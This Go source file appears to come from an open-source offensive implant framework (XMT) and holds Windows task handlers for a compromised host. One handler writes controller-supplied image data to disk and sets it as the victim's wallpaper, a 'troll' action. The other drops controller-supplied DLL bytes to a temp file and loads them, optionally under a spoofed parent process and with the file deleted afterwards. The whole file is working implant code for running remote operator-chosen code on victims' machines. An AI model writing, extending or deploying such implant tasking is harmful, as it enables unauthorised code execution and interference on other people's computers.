//go:build windows && !crypt
// +build windows,!crypt

// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package task

import (
	"context"
	"io"
	"os"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device/winapi"
)

func taskTrollSetWallpaper(r data.Reader) error {
	f, err := data.CreateTemp("", "*.jpg")
	if err != nil {
		return err
	}
	_, err = io.Copy(f, r)
	if f.Close(); err != nil {
		os.Remove(f.Name())
		return err
	}
	return winapi.SetWallpaper(f.Name())
}

// DLLUnmarshal will read this DLL's struct data from the supplied reader and
// returns a DLL runnable struct along with the wait and delete status booleans.
//
// This function returns an error if building or reading fails or if the device
// is not running Windows.
func DLLUnmarshal(x context.Context, r data.Reader) (*cmd.DLL, bool, bool, error) {
	var d DLL
	if err := d.UnmarshalStream(r); err != nil {
		return nil, false, false, err
	}
	if len(d.Data) == 0 && len(d.Path) == 0 {
		return nil, false, false, cmd.ErrEmptyCommand
	}
	p := d.Path
	if len(d.Data) > 0 {
		f, err := data.CreateTemp("", "*.dll")
		if err != nil {
			return nil, false, false, err
		}
		_, err = f.Write(d.Data)
		if f.Close(); err != nil {
			os.Remove(f.Name())
			return nil, false, false, err
		}
		p = f.Name()
	}
	v := cmd.NewDLLContext(x, p)
	v.Timeout = d.Timeout
	v.SetParent(d.Filter)
	return v, d.Wait, d.Path != p, nil
}
